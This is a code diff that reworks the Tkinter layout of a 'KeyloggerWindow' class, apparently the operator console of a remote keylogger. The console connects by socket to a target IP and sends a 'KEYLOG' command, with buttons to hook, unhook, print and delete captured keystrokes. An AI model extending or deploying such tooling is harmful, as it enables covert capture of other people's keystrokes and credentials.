@@ -8,44 +8,39 @@ from pyautogui import scroll
 class KeyloggerWindow(Frame):
     def __init__(self,master,ip,port_no):
         Frame.__init__(self, master)
-        self.master=master
+        self.master=Toplevel(master)
         self.master.resizable(FALSE, FALSE)
+        self.master.columnconfigure(0, weight=1)
+        self.master.columnconfigure(1, weight=1)
+        self.master.columnconfigure(2, weight=1)
+        self.master.columnconfigure(3, weight=1)
         self.ip=ip
         self.port_no=port_no
     
         hookButton = ttk.Button(self.master, text='Hook',command=self.manageEventHook)
-        hookButton.place(x=5,y=5,height=60)
+        hookButton.grid(row=0,column=0,padx=10,pady=10,sticky='w')
 
         unHookButton = ttk.Button(self.master, text='Unhook',command=self.eventUnhook)
-        unHookButton.place(x=130,y=5,height=60)
+        unHookButton.grid(row=0,column=1,sticky='w')
         
         printButton = ttk.Button(self.master, text='Print',command=self.eventPrint)
-        printButton.place(x=255,y=5,height=60)
+        printButton.grid(row=0,column=2,sticky='e')
 
         deleteButton = ttk.Button(self.master, text='Delete',command=self.eventDelete)
-        deleteButton.place(x=380,y=5,height=60)
+        deleteButton.grid(row=0,column=3,padx=10,pady=10,sticky='e')
         #file status
         self.textMulti=Text(self.master)
-        self.textMulti.place(x=5,y=70,height=160)
+        self.textMulti.grid(row=1,column=0,columnspan=4,padx=10,pady=10)
         self.textMulti.configure(state='disabled')
-        
-        
-        '''
-        self.statusText = StringVar()
-        self.statusEntry = ttk.Entry(self.master,width=52,textvariable=self.statusText)
-        self.statusEntry.configure(state='disabled')
-        self.statusEntry.place(x=5,y=70,height=150)
-        '''
 
 
     def loadKeyLog(self):
         self.master.wm_title("Keylogger")
-        self.master.geometry('510x250')
+        self.master.geometry('510x400')
         self.master.mainloop()
     def manageEventHook(self):
         threading.Thread(target=self.eventHook).start()
     def eventHook(self):
-
         cmd = "KEYLOG"
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((self.ip, self.port_no))
